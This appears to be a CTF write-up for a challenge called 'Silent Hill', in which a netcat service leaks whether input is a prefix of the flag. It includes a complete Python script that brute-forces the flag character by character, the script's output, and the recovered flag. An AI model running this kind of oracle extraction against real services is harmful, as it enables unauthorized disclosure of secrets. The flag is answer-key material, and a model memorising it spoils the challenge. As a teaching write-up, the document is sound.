---
title: "Silent Hill - CTF Writeup"
date: 2026-02-11
draft: false
description: "Misc challenge writeup"
tags: ["Misc"]
categories: ["Writeups"]
---

**Challenge Name:** Silent Hill  
**Category:** Misc  
**CTF:** MOJO-JOJO  
**Description:** Some words return instantly; others linger, lost in the complexity of the abyss.  
**Connection:** `nc 4.233.210.175 9011`

---

## Initial Analysis

When connecting to the server, it accepts input and returns a response indicating whether there's a match along with timing information:

```
$ nc 4.233.210.175 9011
test
Result: No match
Time: 0.000082s
```

The hint about "words lingering in complexity" initially suggested a ReDoS (Regular Expression Denial of Service) attack, where certain patterns cause catastrophic backtracking in vulnerable regex engines. However, the actual mechanism turned out to be simpler.

## Key Insight

After testing with the hint that the flag starts with `MOJO-JOJO{`, we discovered that the server implements a **prefix-matching oracle**:

```
MOJO-JOJO{
Result: Matched
Time: 0.000064s
```

The server returns "Matched" when the input is a valid prefix of the flag, and "No match" otherwise. This allows us to extract the flag character by character.

## Solution Approach

1. Start with the known prefix `MOJO-JOJO{`
2. For each position, try all possible characters (letters, digits, special characters)
3. When a character results in "Matched", append it to our known prefix
4. Repeat until we find the closing brace `}`

## Exploitation Script

```python
#!/usr/bin/env python3
import socket
import time
import string

def test_input(s, text):
    """Send input to server and get response"""
    s.sendall((text + '\n').encode())
    
    # Receive response
    response = b''
    s.settimeout(2)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
            if b'Time:' in response:
                break
    except socket.timeout:
        pass
    
    return response.decode('utf-8', errors='ignore')

def extract_time(response):
    """Extract timing from response"""
    if 'Time:' in response:
        try:
            time_str = response.split('Time:')[1].strip().rstrip('s')
            return float(time_str)
        except:
            return 0
    return 0

def main():
    host = '4.233.210.175'
    port = 9011
    
    # Start with known prefix
    known = "MOJO-JOJO{"
    
    # Character set to try
    charset = string.ascii_letters + string.digits + "_-{}!@#$%^&*()[]"
    
    print(f"Starting with: {known}")
    
    while True:
        best_char = None
        best_time = 0
        results = []
        
        # Try each character
        for char in charset:
            test_str = known + char
            
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                response = test_input(s, test_str)
                s.close()
                
                timing = extract_time(response)
                matched = "Matched" in response
                
                results.append((char, timing, matched, response.strip()))
                
                if matched:
                    print(f"  [MATCH] '{char}' -> {response.strip()}")
                    best_char = char
                    break
                
                time.sleep(0.05)
            except Exception as e:
                print(f"Error with {repr(test_str)}: {e}")
        
        # Sort by timing to see which took longest
        results.sort(key=lambda x: x[1], reverse=True)
        
        print(f"\nTop 5 by timing:")
        for char, timing, matched, resp in results[:5]:
            print(f"  '{char}': {timing:.6f}s - {resp}")
        
        if best_char:
            known += best_char
            print(f"\n✓ Found: {known}\n")
            
            # Check if we found the closing brace
            if best_char == '}':
                print(f"\n FLAG FOUND: {known}")
                break
        else:
            # If no match, pick the one with highest time (ReDoS approach)
            best_char = results[0][0]
            known += best_char
            print(f"\n? Guessing based on timing: {known}\n")

if __name__ == '__main__':
    main()
```

## Execution

Running the script automatically extracts the flag character by character:

```
Starting with: MOJO-JOJO{
  [MATCH] 't' -> Result: Matched
✓ Found: MOJO-JOJO{t

  [MATCH] 'h' -> Result: Matched
✓ Found: MOJO-JOJO{th

  [MATCH] '3' -> Result: Matched
✓ Found: MOJO-JOJO{th3

...

  [MATCH] '}' -> Result: Matched
✓ Found: MOJO-JOJO{th3_r3g3x_0r4cl3_1s_sh4rp_4nd_d4ng3r0us}

FLAG FOUND: MOJO-JOJO{th3_r3g3x_0r4cl3_1s_sh4rp_4nd_d4ng3r0us}
```

## Flag

```
MOJO-JOJO{th3_r3g3x_0r4cl3_1s_sh4rp_4nd_d4ng3r0us}
```

## Conclusion

This challenge demonstrated a **regex oracle attack** where a vulnerable implementation leaks information about valid prefixes. The flag message itself hints at the vulnerability: "the regex oracle is sharp and dangerous" - a reference to how regex pattern matching can inadvertently leak information when used for validation without proper safeguards.
